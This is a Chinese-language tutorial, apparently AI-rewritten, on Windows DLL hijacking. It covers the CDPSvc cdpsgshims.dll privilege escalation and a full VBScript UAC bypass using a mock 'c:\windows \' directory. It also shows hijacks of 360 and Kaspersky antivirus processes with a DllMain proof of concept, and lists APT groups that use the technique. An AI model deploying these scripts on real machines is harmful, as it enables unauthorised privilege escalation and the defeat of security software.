### 优化后的文本

#### 概述
本文将讨论 `cdpsgshims.dll` 和 `WptsExtensions.dll` 的潜在安全风险，以及如何通过 DLL 劫持进行提权。此外，还将探讨如何利用这些技术绕过用户账户控制 (UAC) 和对抗杀毒软件。

#### 1. `cdpsgshims.dll` 和 `WptsExtensions.dll` 的潜在风险
`cdpsgshims.dll` 和 `WptsExtensions.dll` 可能通过 `%PATH%` 目录被劫持，从而导致提权漏洞。

- **DLL 信息**
  - **Name**: `cdpsgshims.dll`
  - **Description**: 由 `CDPSvc` 服务在启动时加载。
  - **RunAs**: `NT AUTHORITY\LocalService`
  - **RebootRequired**: `True`

- **CDPSvc 服务**
  - **Display Name**: Connected Devices Platform Service
  - **Path**: `%WinDir%\system32\svchost.exe -k LocalService -p`
  - **File**: `%WinDir%\System32\CDPSvc.dll`
  - **功能**: 该服务在连接外围设备（如蓝牙、打印机、扫描仪等）时发挥作用，为 PC 和智能手机等设备提供发现和发送消息的方式。

- **检测方法**
  - 使用 `PrivescCheck` 工具检测是否存在可劫持的 DLL：
    ```powershell
    Import-Module .\PrivescCheck.ps1
    Invoke-HijackableDllsCheck
    ```

- **验证**
  - 在 Process Monitor 中可以看到服务找不到 `cdpsgshims.dll` 的情况。
  - 检查环境变量中的 `PATH` 配置，确认其值是否正确。
  - 查看 ACL 发现低权限用户可以写入。

- **利用方法**
  - 将恶意 DLL 复制到目标目录中，可以看到服务成功加载了我们的 DLL。

#### 2. 绕过 UAC
用户账户控制 (UAC) 是 Windows Vista 引入的安全功能，要求用户在提升权限时进行确认。Windows 7 引入了自动提升功能，如果某些进程位于受信任的目录（如 `C:\Windows\System32`），则会自动提升。

- **目标 DLL**
  - `winsat.exe` 是 Windows 系统评估工具，需要劫持的 DLL 为 `dxgi.dll`。

- **利用方法**
  - 创建一个带有尾随空格的文件夹来模拟受信任的目录：
    ```vbscript
    Set oFSO = CreateObject("Scripting.FileSystemObject")
    Set wshshell = WScript.CreateObject("WScript.Shell")

    ' 获取目标二进制文件和 payload
    WScript.StdOut.Write("System32 binary: ")
    strBinary = WScript.StdIn.ReadLine()
    WScript.StdOut.Write("Path to your DLL: ")
    strDLL = WScript.StdIn.ReadLine()

    ' 创建文件夹
    Const target = "c:\windows \"
    target_sys32 = (target & "system32\")
    target_binary = (target_sys32 & strBinary)
    If Not oFSO.FolderExists(target) Then oFSO.CreateFolder target End If
    If Not oFSO.FolderExists(target_sys32) Then oFSO.CreateFolder target_sys32 End If

    ' 复制合法二进制文件和恶意 DLL
    oFSO.CopyFile ("c:\windows\system32\" & strBinary), target_binary
    oFSO.CopyFile strDLL, target_sys32

    ' 运行目标二进制文件
    wshshell.Run("""" & target_binary & """")

    ' 清理文件
    WScript.StdOut.Write("Clean up? (press enter to continue)")
    WScript.StdIn.ReadLine()
    wshshell.Run("powershell /c ""rm -r """"\\?\" & target & """""""") ' 使用 PowerShell 删除文件
    ```

#### 3. 对抗杀毒软件
所有 Windows 应用程序都可能存在 DLL 劫持的风险，包括杀毒软件。以下是一些实例：

- **实例 1：劫持 360 杀毒**
  - `mdnsnsp.dll` 文件属于 Bonjour 软件包，可以在 `C:\Program Files\Bonjour` 路径中放置恶意 DLL。
  - 如果 `360sd.exe` 加载了这个 DLL，就可以启动 CMD 并执行恶意代码。

- **实例 2：劫持卡巴斯基的 `wow64log.dll`**
  - `AVP.exe`、`Avpui.exe` 和 `kpm.exe` 都会加载不存在的 `Wow64log.dll`，路径为 `C:\Windows\System32\`。
  - 作为管理员，可以构造恶意 `Wow64log.dll` 文件并复制到 `System32` 目录中。

- **示例代码**
  ```cpp
  #include "pch.h"
  #include <windows.h>
  #include <process.h>
  #include <stdio.h>
  #include <string.h>

  BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
      switch (ul_reason_for_call) {
          case DLL_PROCESS_ATTACH:
              STARTUPINFO si = { sizeof(si) };
              PROCESS_INFORMATION pi;
              CreateProcess(TEXT("C:\\Windows\\System32\\calc.exe"), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
              break;
          case DLL_THREAD_ATTACH:
          case DLL_THREAD_DETACH:
          case DLL_PROCESS_DETACH:
              break;
      }
      return TRUE;
  }
  ```

- **注意事项**
  - 卡巴斯基具有自我保护机制，即使管理员也无法终止或注入 `Avp.exe` 或 `Avpui.exe` 进程。
  - 但是，可以通过在一个上下文中执行代码来“攻击”并杀死其他卡巴斯基进程。

#### 4. APT 攻击中的 DLL 劫持
许多 APT 攻击组织使用 DLL 劫持技术来进行持久化和提权。例如：

- **APT41**: 使用搜索顺序劫持
- **FinFisher**: 变种使用 DLL 搜索顺序劫持
- **Chaes**: 搜索顺序劫持以加载恶意 DLL 有效负载
- **Astaroth**: 使用搜索顺序劫持来启动自身
- **BOOSTWRITE**: 利用加载合法的 `.dll` 文件
- **BackdoorDiplomacy**: 使用搜索顺序劫持
- **HinKit**: 搜索顺序劫持作为一种持久性机制
- **Downdelph**: 通过搜索顺序劫持 `.exe` 文件来提升权限
- **InvisiMole**: 搜索顺序劫持在启动期间启动受感染的 DLL
- **HTTPBrowser**: 干扰 DLL 加载顺序
- **Ramsey**: 劫持过时的 Windows 应用程序
- **menuPass**: 使用 DLL 搜索顺序劫持
- **ThreatGroup-3390**: 使用 DLL 搜索顺序劫持来分发有效负载
- **Whitefly**: 搜索顺序劫持感染恶意 DLL
- **RTM**: 搜索订单劫持以干扰 TeamViewer
- **Tonto 团队**: 干扰合法的 Microsoft 可执行文件以加载恶意 DLL
- **Melcoz**: 使用 DLL 劫持绕过安全控制

#### 5. 参考资料
- [Microsoft Docs - DLL Search Order](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [ITM4n - Windows DLL Hijacking Clarified](https://itm4n.github.io/windows-dll-hijacking-clarified/)
- [Wietze Beukema - Hijacking DLLs in Windows](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)
- [ITM4n - Windows Server Netman DLL Hijacking](https://itm4n.github.io/windows-server-netman-dll-hijacking/)
- [Medium - UAC Bypass by Mocking Trusted Directories](https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e)

希望这些信息对您有所帮助。如果您有任何进一步的问题，请随时联系我。